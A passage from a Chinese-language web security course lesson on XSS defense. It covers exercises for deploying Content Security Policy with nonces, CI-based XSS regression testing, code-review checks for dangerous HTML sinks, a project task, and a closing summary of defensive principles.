3. 将内联脚本全部迁移到外部文件或添加 nonce
4. 将 CSP 切换为强制模式，在浏览器 Console 中确认没有 CSP 报错
5. 写一份 CSP 部署文档，包含：策略说明、nonce 生成方式、报告端点、回滚方案

### 挑战练习：建立 XSS 安全回归体系

1. 在你的 CI/CD 流水线中集成自动化 XSS 扫描（推荐工具：ZAP Baseline Scan 或 Playwright 自定义安全测试脚本）
2. 编写一套端到端的安全测试用例，覆盖：存储型 XSS、反射型 XSS、DOM 型 XSS、CSP 绕过尝试
3. 在代码审查 Checklist 中增加"是否涉及 dangerouslySetInnerHTML / v-html / innerHTML / document.write"，要求每个使用点都必须说明安全理由并附带 DOMPurify 净化
4. 建立 CSP 违规告警机制：当生产环境出现 CSP 违规时，自动发送告警到团队的飞书/Slack 频道

<!-- exercise-guidance:start -->
### 作业参考与验收

- **基础**：在本地靶场记录来源→sink→执行 marker；普通文本用 textContent，富文本用合适净化，URL 单独校验 scheme。escapeHtml 只对应 HTML 文本上下文，不覆盖 JS/CSS/URL。
- **进阶**：先 Report-Only 收集并分类违规，nonce 每响应随机且不信任用户提供。强制后正常脚本工作、注入脚本失败；无 48h 真实采集不得写成已观察。
- **挑战**：用实际浏览器 marker 回归 DOM/存储/反射 XSS；ZAP baseline 被动扫描不等于自动覆盖主动 XSS。每个危险 sink 有理由与控制，报告拒绝/执行两种证据。
<!-- exercise-guidance:end -->
<!-- atlas-task:start -->
## Atlas 项目任务

- 项目起点：[Atlas 贯穿项目](../../projects/atlas/README.md)
- 阶段目标：[L5 里程碑](../../projects/atlas/milestones/L5.md)
- 本课任务：按 L5 里程碑在 Atlas 中建立“XSS 防御与 CSP 策略”的可量化基线、改进方案、前后证据和长期治理规则。
- 起始验证：在 `前端学习路线` 目录运行 `npm run atlas:test`。
- 自动检查：为本课新增或修改的行为补充测试；无法自动化的浏览器行为必须保留截图、Network、Performance 或无障碍树证据。

### 项目验收

- [ ] 正常路径可以从统一入口复现
- [ ] 空值、错误或权限边界至少覆盖一项
- [ ] 相关自动测试通过，且没有删除既有断言
- [ ] 记录一个“现象—原因—验证—结论”
<!-- atlas-task:end -->

---

## 本节小结

XSS 不是某个具体的技术漏洞，而是一类思维漏洞——在任何"把不可信数据嵌入到网页"的地方，都存在 XSS 的可能。

你需要在三个层面建立防御体系：

1. **输出编码**是你的肌肉记忆。每次拼接 HTML 时，先问自己三个问题：我在哪个上下文（HTML？JS？URL？）？我用什么编码？我的编码方式适用于这个上下文吗？
2. **CSP 是你的安全网**。用 nonce 或 hash 替代 `'unsafe-inline'`，用 Report-Only 模式验证，用违规报告监控。CSP 的目的不是"防止 XSS"，而是"在 XSS 发生时把影响降到最低"。
3. **框架不是银弹**。React 和 Vue 给了你很好的默认行为，但它们的"逃生舱"（dangerouslySetInnerHTML、v-html）一直在那里，等着你不小心使用。

安全不是功能，是贯穿开发生命周期的思维。从编写第一行 HTML 开始，你就在和安全打交道。

<!-- course-nav:start -->
---

[上一篇：04-渲染性能与动画优化](../01-性能工程/04-渲染性能与动画优化.md) · [课程地图](../../README.md) · [下一篇：02-CSRF 与认证安全](./02-CSRF与认证安全.md)
<!-- course-nav:end -->
